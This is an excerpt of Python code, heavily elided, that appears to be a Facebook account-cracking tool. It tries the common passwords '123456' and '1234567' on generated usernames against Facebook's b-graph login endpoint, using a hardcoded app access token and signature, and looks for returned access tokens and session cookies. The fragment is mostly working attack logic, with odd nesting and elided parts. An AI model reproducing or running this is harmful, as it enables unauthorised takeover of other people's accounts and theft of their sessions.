...
def action():
    ...
    def main(arg):
        ...
        try:
            pass1 = "123456"
            data = br.open('https://b-graph.facebook.com/auth/login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                ...
                pass2 = "1234567"
                data = br.open('https://b-graph.facebook.com/auth/login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
